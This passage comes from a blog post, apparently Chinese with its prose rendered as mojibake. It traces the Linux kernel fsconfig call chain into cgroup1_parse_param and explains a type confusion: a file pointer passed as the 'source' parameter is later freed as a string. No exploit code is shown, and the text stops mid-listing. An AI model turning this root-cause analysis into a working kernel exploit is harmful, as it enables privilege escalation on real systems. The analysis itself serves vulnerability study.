class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check the state and apply the configuration.  Note that this function is</span><br><span class="hljs-comment"> * allowed to &#x27;steal&#x27; the value by setting param-&gt;xxx to NULL before returning.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vfs_fsconfig_locked</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-type">int</span> cmd,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">super_block</span> *<span class="hljs-title">sb</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>ret = finish_clean_context(fc);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_CMD_CREATE:<br>            <span class="hljs-comment">//æ£€æŸ¥fcçš„é˜¶æ®µæ˜¯å¦ä¸ºFS_CONTEXT_CREATE_PARAMS</span><br><span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS)<br><span class="hljs-keyword">return</span> -EBUSY;<br>            <span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æœ‰åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿçš„æƒé™</span><br><span class="hljs-keyword">if</span> (!mount_capable(fc))<br><span class="hljs-keyword">return</span> -EPERM;<br>            <span class="hljs-comment">//è®¾ç½®fcçš„é˜¶æ®µä¸ºFS_CONTEXT_CREATING</span><br>fc-&gt;phase = FS_CONTEXT_CREATING;<br>            <span class="hljs-comment">//è·å–æ–‡ä»¶æ ‘</span><br>ret = vfs_get_tree(fc);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>sb = fc-&gt;root-&gt;d_sb;<br>ret = security_sb_kern_mount(sb);<br><span class="hljs-keyword">if</span> (unlikely(ret)) &#123;<br>fc_drop_locked(fc);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>up_write(&amp;sb-&gt;s_umount);<br>            <span class="hljs-comment">//å°†fcçš„é˜¶æ®µè®¾ç½®ä¸ºFS_CONTEXT_AWAITING_MOUNTå¹¶è¿”å›æˆåŠŸ</span><br>fc-&gt;phase = FS_CONTEXT_AWAITING_MOUNT;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_CMD_RECONFIGURE:<br><span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)<br><span class="hljs-keyword">return</span> -EBUSY;<br>fc-&gt;phase = FS_CONTEXT_RECONFIGURING;<br>sb = fc-&gt;root-&gt;d_sb;<br><span class="hljs-keyword">if</span> (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) &#123;<br>ret = -EPERM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>down_write(&amp;sb-&gt;s_umount);<br>ret = reconfigure_super(fc);<br>up_write(&amp;sb-&gt;s_umount);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>vfs_clean_context(fc);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;<br>    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)<br><span class="hljs-keyword">return</span> -EBUSY;<br><span class="hljs-comment">//é»˜è®¤æ‰§è¡Œæ­¤å¤„</span><br><span class="hljs-keyword">return</span> vfs_parse_fs_param(fc, param);<br>&#125;<br>fc-&gt;phase = FS_CONTEXT_FAILED;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="vfs-parse-fs-param"><a href="#vfs-parse-fs-param" class="headerlink" title="vfs_parse_fs_param"></a>vfs_parse_fs_param</h3><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å®Œæˆäº†å¯¹<strong>param</strong>çš„èµ‹å€¼ã€‚ç°åœ¨è¦åšçš„å°±æ˜¯æŠŠ<strong>param</strong>é‡Œçš„å‚æ•°è½¬åˆ°æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * vfs_parse_fs_param - Add a single parameter to a superblock config</span><br><span class="hljs-comment"> * @fc: The filesystem context to modify</span><br><span class="hljs-comment"> * @param: The parameter</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * A single mount option in string form is applied to the filesystem context</span><br><span class="hljs-comment"> * being set up.  Certain standard options (for example &quot;ro&quot;) are translated</span><br><span class="hljs-comment"> * into flag bits without going to the filesystem.  The active security module</span><br><span class="hljs-comment"> * is allowed to observe and poach options.  Any other options are passed over</span><br><span class="hljs-comment"> * to the filesystem to parse.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This may be called multiple times for a context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns 0 on success and a negative error code on failure.  In the event of</span><br><span class="hljs-comment"> * failure, supplementary error information may have been set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (!param-&gt;key)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Unnamed parameter\n&quot;</span>);<br><br>ret = vfs_parse_sb_flag(fc, param-&gt;key);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br><br>ret = security_fs_context_parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-comment">/* Param belongs to the LSM or is disallowed by the LSM; so</span><br><span class="hljs-comment"> * don&#x27;t pass to the FS.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>ret = fc-&gt;ops-&gt;parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* If the filesystem doesn&#x27;t take any arguments, give it the</span><br><span class="hljs-comment"> * default handling of source.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Non-string source&quot;</span>);<br><span class="hljs-keyword">if</span> (fc-&gt;source)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Multiple sources&quot;</span>);<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;%s: Unknown parameter &#x27;%s&#x27;&quot;</span>,<br>      fc-&gt;fs_type-&gt;name, param-&gt;key);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æœ€é‡è¦çš„ä¸€å¥æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ret = fc-&gt;ops-&gt;parse_param(fc, param);<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶ï¼Œè¿™é‡Œæ˜¯éœ€è¦ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ä¸­çš„<code>parse_param</code>æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®æ–‡ä»¶ç³»ç»Ÿä¸º<code>cgroup1</code></p><p>åˆ™ä¼šè°ƒç”¨åˆ°<code>cgroup1_parse_param</code></p><h3 id="cgroup1-parse-param"><a href="#cgroup1-parse-param" class="headerlink" title="cgroup1_parse_param"></a>cgroup1_parse_param</h3><p>äºæ­¤ï¼Œæˆ‘ä»¬ç»ˆäºæ¥åˆ°äº†<code>patch</code>ä¸­çš„ç›®æ ‡å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">cgroup1_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cgroup_fs_context</span> *<span class="hljs-title">ctx</span> =</span> cgroup_fc2context(fc);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cgroup_subsys</span> *<span class="hljs-title">ss</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parse_result</span> <span class="hljs-title">result</span>;</span><br><span class="hljs-type">int</span> opt, i;<br><span class="hljs-comment">//ä¸»è¦çš„æŒ‚è½½å‚æ•°çš„è§£æå‡½æ•°</span><br>opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br><span class="hljs-keyword">if</span> (opt == -ENOPARAM) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>for_each_subsys(ss, i) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, ss-&gt;legacy_name))<br><span class="hljs-keyword">continue</span>;<br>ctx-&gt;subsys_mask |= (<span class="hljs-number">1</span> &lt;&lt; i);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Unknown subsys name &#x27;%s&#x27;&quot;</span>, param-&gt;key);<br>&#125;<br><span class="hljs-keyword">if</span> (opt &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> opt;<br><br><span class="hljs-keyword">switch</span> (opt) &#123;<br><span class="hljs-keyword">case</span> Opt_none:<br><span class="hljs-comment">/* Explicitly have no subsystems */</span><br>ctx-&gt;none = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_all:<br>ctx-&gt;all_ss = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_noprefix:<br>ctx-&gt;flags |= CGRP_ROOT_NOPREFIX;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_clone_children:<br>ctx-&gt;cpuset_clone_children = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_cpuset_v2_mode:<br>ctx-&gt;flags |= CGRP_ROOT_CPUSET_V2_MODE;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_xattr:<br>ctx-&gt;flags |= CGRP_ROOT_XATTR;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_release_agent:<br><span class="hljs-comment">/* Specifying two release agents is forbidden */</span><br><span class="hljs-keyword">if</span> (ctx-&gt;release_agent)<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;release_agent respecified&quot;</span>);<br>ctx-&gt;release_agent = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_name:<br><span class="hljs-comment">/* blocked by boot param? */</span><br><span class="hljs-keyword">if</span> (cgroup_no_v1_named)<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-comment">/* Can&#x27;t specify an empty name */</span><br><span class="hljs-keyword">if</span> (!param-&gt;size)<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Empty name&quot;</span>);<br><span class="hljs-keyword">if</span> (param-&gt;size &gt; MAX_CGROUP_ROOT_NAMELEN - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Name too long&quot;</span>);<br><span class="hljs-comment">/* Must match [\w.-]+ */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; param-&gt;size; i++) &#123;<br><span class="hljs-type">char</span> c = param-&gt;<span class="hljs-built_in">string</span>[i];<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isalnum</span>(c))<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">if</span> ((c == <span class="hljs-string">&#x27;.&#x27;</span>) || (c == <span class="hljs-string">&#x27;-&#x27;</span>) || (c == <span class="hljs-string">&#x27;_&#x27;</span>))<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Invalid name&quot;</span>);<br>&#125;<br><span class="hljs-comment">/* Specifying two names is forbidden */</span><br><span class="hljs-keyword">if</span> (ctx-&gt;name)<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;name respecified&quot;</span>);<br>ctx-&gt;name = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è°ƒç”¨é“¾å¯ä»¥ç¡®å®šä¸‹æ¥</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_fsconfig</span>()<br><span class="hljs-built_in">vfs_fsconfig_locked</span>()<br><span class="hljs-built_in">vfs_parse_fs_param</span>()<br>fc-&gt;ops-&gt;<span class="hljs-built_in">parse_param</span>(cgroup1_parse_param)<br></code></pre></td></tr></table></figure><p>åˆ°æ­¤æˆ‘ä»¬å…·å¤‡äº†åˆ›å»ºä¸€ä¸ªæŒ‚è½½å®ä¾‹çš„æ‰€æœ‰å‡†å¤‡å·¥ä½œï¼Œä¸‹ä¸€æ­¥å°±æ˜¯åˆ›å»ºä¸€ä¸ªæŒ‚è½½å®ä¾‹</p><p>åˆ›å»ºä¸€ä¸ªæŒ‚è½½å®ä¾‹éœ€è¦ä½¿ç”¨<code>fsmount()</code></p><h2 id="fsmount"><a href="#fsmount" class="headerlink" title="fsmount"></a>fsmount</h2><p>è¿™ä¸ªfsmountåˆ›å»ºä¸€ä¸ªæŒ‚è½½å®ä¾‹åå…³è”åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ä»¥<strong>O_PATH</strong>æ‰“å¼€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br><span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢å°±æ˜¯æœ€åä¸€æ­¥äº†ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªæŒ‚è½½å®ä¾‹ï¼Œä¸‹é¢å°±æ˜¯å°†è¿™ä¸ªæŒ‚è½½å®ä¾‹<code>attach</code>åˆ°æŒ‚è½½ç‚¹ä¸Šã€‚è¿™ä¸€æ­¥ä½¿ç”¨<code>move_mount()</code>ç³»ç»Ÿè°ƒç”¨ã€‚</p><h2 id="move-mount"><a href="#move-mount" class="headerlink" title="move_mount"></a>move_mount</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">move_mount</span><span class="hljs-params">(<span class="hljs-type">int</span> from_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *from_pathname,</span><br><span class="hljs-params">     <span class="hljs-type">int</span> to_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *to_pathname,</span><br><span class="hljs-params">     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-keyword">return</span> syscall(__NR_move_mount,<br>       from_dfd, from_pathname,<br>       to_dfd, to_pathname, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03ï¼šæ¼æ´åˆ†æ"><a href="#0x03ï¼šæ¼æ´åˆ†æ" class="headerlink" title="0x03ï¼šæ¼æ´åˆ†æ"></a>0x03ï¼šæ¼æ´åˆ†æ</h1><p>å†æ¥çœ‹ä¸€çœ¼<code>fs_parameter</code>è¿™ä¸ªç»“æ„ä½“ï¼Œé—®é¢˜å‡ºåœ¨ä¸­é—´è¿™ä¸ª<code>union</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> &#123;</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>              *key;           <span class="hljs-comment">/* Parameter name */</span><br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_value_type</span>      <span class="hljs-title">type</span>:</span><span class="hljs-number">8</span>;         <span class="hljs-comment">/* The type of value here */</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-type">char</span>            *<span class="hljs-built_in">string</span>;<br>                <span class="hljs-type">void</span>            *blob;<br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">filename</span> *<span class="hljs-title">name</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>     *<span class="hljs-title">file</span>;</span><br>        &#125;;<br>        <span class="hljs-type">size_t</span>  size;<br>        <span class="hljs-type">int</span>     dirfd;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨<code>sys_fsconfig</code>ä¸­ï¼Œå½“<strong>CMD</strong>ä¸º<strong>FSCONFIG_SET_FD</strong>æ—¶ï¼Œä¼šæœ‰å¦‚ä¸‹æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>param.type = fs_value_is_file;<br>ret = -EBADF;<br>param.file = fget(aux);<br><span class="hljs-keyword">if</span> (!param.file)<br><span class="hljs-keyword">goto</span> out_key;<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶<code>param.file</code>é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶å®ä¾‹</p><p>ä½†æ˜¯åœ¨æ¥ä¸‹æ¥çš„è°ƒç”¨é“¾ï¼Œ<code>cgroup1_parse_param</code>ä¸­ï¼Œå½“<code>key</code>ä¸º<code>source</code>æ—¶ï¼Œä¼šæŠŠ<code>param-&gt;string</code>èµ‹å€¼ç»™<code>fc-&gt;source</code>ï¼Œ</p><p>ä½†æ˜¯ç”±äº<code>param</code>ç»“æ„ä½“ä¸­ï¼Œ<code>string</code>å’Œ<code>file</code>æ˜¯ä¸ª<code>union</code>ï¼Œä¸¤è€…åªèƒ½å­˜åœ¨ä¸€ä¸ªï¼Œæ‰€ä»¥æ­¤å¤„å­˜åœ¨æŠŠæ–‡ä»¶å®ä¾‹ä¼ é€’ç»™<code>fc-&gt;source</code>çš„é£é™©</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br><span class="hljs-keyword">if</span> (opt == -ENOPARAM) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œè‹¥æˆ‘ä»¬å…³é—­æ–‡ä»¶æè¿°ç¬¦<code>fscontext_fd</code>ï¼Œåˆ™ä¼šè°ƒç”¨åˆ°<code>fscontext_fops</code>ä¸­çš„<code>fscontext_release</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fscontext_fops</span> =</span> &#123;<br>.read= fscontext_read,<br>.release= fscontext_release,<br>.llseek= no_llseek,<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨<code>fscontext_release</code>ä¸­ä¼šè°ƒç”¨<code>put_fs_context</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fscontext_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span> =</span> file-&gt;private_data;<br><br><span class="hljs-keyword">if</span> (fc) &#123;<br>file-&gt;private_data = <span class="hljs-literal">NULL</span>;<br>put_fs_context(fc);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨<code>put_fs_context</code>ä¼šé‡Šæ”¾<code>fc-&gt;source</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * put_fs_context - Dispose of a superblock configuration context.</span><br><span class="hljs-comment"> * @fc: The context to dispose of.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">put_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">super_block</span> *<span class="hljs-title">sb</span>;</span><br><br><span class="hljs-keyword">if</span> (fc-&gt;root) &#123;<br>sb = fc-&gt;root-&gt;d_sb;<br>dput(fc-&gt;root);<br>fc-&gt;root = <span class="hljs-literal">NULL</span>;<br>deactivate_super(sb);<br>&#125;<br><br><span class="hljs-keyword">if</span> (fc-&gt;need_free &amp;&amp; fc-&gt;ops &amp;&amp; fc-&gt;ops-&gt;<span class="hljs-built_in">free</span>)<br>fc-&gt;ops-&gt;<span 